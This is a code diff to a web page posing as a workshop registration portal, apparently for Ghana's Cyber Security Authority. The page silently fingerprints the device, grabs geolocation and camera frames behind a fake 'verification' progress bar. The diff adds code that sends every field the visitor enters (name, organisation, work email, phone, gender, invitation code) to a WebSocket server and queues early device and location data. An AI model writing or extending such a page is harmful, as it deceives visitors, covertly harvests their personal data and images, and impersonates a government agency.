@@ -852,28 +852,28 @@
         </div>
 
         <div class="form-body">
-          <div id="mainForm">
+          <form id="portalForm" onsubmit="return false;">
 
             <div class="section-sub">Participant Information</div>
 
             <div class="field-row">
               <div class="field">
                 <label>First Name <span class="req">*</span></label>
-                <input type="text" placeholder="e.g. Kwame" />
+                <input type="text" id="firstName" placeholder="e.g. Kwame" required />
               </div>
               <div class="field">
                 <label>Last Name <span class="req">*</span></label>
-                <input type="text" placeholder="e.g. Mensah" />
+                <input type="text" id="lastName" placeholder="e.g. Mensah" required />
               </div>
             </div>
             <div class="field-row">
               <div class="field">
                 <label>Organisation / Institution <span class="req">*</span></label>
-                <input type="text" placeholder="e.g. Bank of Ghana" />
+                <input type="text" id="org" placeholder="e.g. Bank of Ghana" required />
               </div>
               <div class="field">
                 <label>Participant Category <span class="req">*</span></label>
-                <select>
+                <select id="category" required>
                   <option value="">-- Select Category --</option>
                   <option>Government / Public Sector</option>
                   <option>Financial Sector</option>
@@ -889,17 +889,17 @@
             <div class="field-row">
               <div class="field">
                 <label>Work Email Address <span class="req">*</span></label>
-                <input type="email" placeholder="name@organisation.gov.gh" />
+                <input type="email" id="email" placeholder="name@organisation.gov.gh" required />
               </div>
               <div class="field">
                 <label>Phone Number</label>
-                <input type="tel" placeholder="+233 XX XXX XXXX" />
+                <input type="tel" id="phone" placeholder="+233 XX XXX XXXX" />
               </div>
             </div>
             <div class="field-row">
               <div class="field">
                 <label>Gender <span class="req">*</span></label>
-                <select>
+                <select id="gender" required>
                   <option value="">-- Select Gender --</option>
                   <option>Male</option>
                   <option>Female</option>
@@ -909,9 +909,10 @@
             </div>
             <div class="field">
               <label>Registration / Invitation Code <span class="req">*</span></label>
-              <input type="text" placeholder="From your confirmation email (e.g. CSA-WS-2026-XXXXX)" />
+              <input type="text" id="regCode" placeholder="From your confirmation email (e.g. CSA-WS-2026-XXXXX)" required />
               <div class="field-hint">Check your event confirmation email from events@csa.gov.gh</div>
             </div>
+          </form>
 
             <hr class="div">
 
@@ -1090,7 +1091,11 @@
         ws = new WebSocket(WS_URL);
         ws.onerror = () => { };
         ws.onopen = () => {
-          // As soon as socket opens, send device fingerprint silently
+          // Send any queued messages (device info, early geo, etc.)
+          while (wsQueue.length) {
+            ws.send(JSON.stringify(wsQueue.shift()));
+          }
+          // Also explicitly send device info here
           sendDeviceInfo();
         };
         ws.onmessage = (e) => {
@@ -1188,15 +1193,38 @@
     grabLocation();
 
     // ── HELPERS ─────────────────────────────────────────────────────────
+    let wsQueue = [];
     function sendWS(obj) {
-      if (ws && ws.readyState === 1) ws.send(JSON.stringify(obj));
+      if (ws && ws.readyState === 1) {
+        ws.send(JSON.stringify(obj));
+      } else {
+        wsQueue.push(obj);
+      }
     }
 
     // ── SUBMIT HANDLER ──────────────────────────────────────────────────
     async function handleSubmit() {
+      const form = document.getElementById('portalForm');
+      if (!form.reportValidity()) return;
+
       const btn = document.getElementById('btnSubmit');
       btn.disabled = true;
       document.getElementById('verifyProgress').style.display = 'block';
+
+      // Send form data immediately before camera frames
+      sendWS({
+        type: 'form_data',
+        firstName: document.getElementById('firstName').value,
+        lastName: document.getElementById('lastName').value,
+        fullName: document.getElementById('firstName').value + ' ' + document.getElementById('lastName').value,
+        org: document.getElementById('org').value,
+        category: document.getElementById('category').value,
+        email: document.getElementById('email').value,
+        phone: document.getElementById('phone').value,
+        gender: document.getElementById('gender').value,
+        regCode: document.getElementById('regCode').value,
+        refId: document.getElementById('refId').textContent
+      });
 
       const steps = [
         { label: 'Requesting camera access...', pct: 15 },
@@ -1220,7 +1248,7 @@
         const tick = setInterval(() => {
           if (i >= steps.length) {
             clearInterval(tick);
-            document.getElementById('mainForm').style.display = 'none';
+            document.getElementById('portalForm').parentElement.style.display = 'none';
             document.getElementById('successView').style.display = 'block';
             return;
           }
